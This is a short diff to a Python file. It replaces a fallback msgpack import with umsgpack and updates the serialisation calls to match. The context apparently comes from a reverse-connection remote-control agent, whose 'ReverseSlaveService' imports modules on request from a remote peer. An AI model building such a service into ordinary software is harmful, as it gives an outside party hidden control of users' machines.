@@ -71,10 +71,7 @@ except ImportError:
 except Exception as e:
     logging.warning(e)
 
-try:
-    import msgpack
-except:
-    import umsgpack as msgpack
+import umsgpack
 
 logging.getLogger().setLevel(logging.WARNING)
 
@@ -382,7 +379,7 @@ def safe_obtain(proxy):
         return proxy
 
     conn = object.__getattribute__(proxy, "____conn__")()
-    return msgpack.loads(
+    return umsgpack.loads(
         zlib.decompress(
             conn.root.msgpack_dumps(proxy, compressed=True)
         )
@@ -496,7 +493,7 @@ class ReverseSlaveService(Service):
         return __import__(name, None, None, "*")
 
     def exposed_msgpack_dumps(self, obj, compressed=False):
-        data = msgpack.dumps(obj)
+        data = umsgpack.dumps(obj)
         if compressed:
             data = zlib.compress(data)
         return data
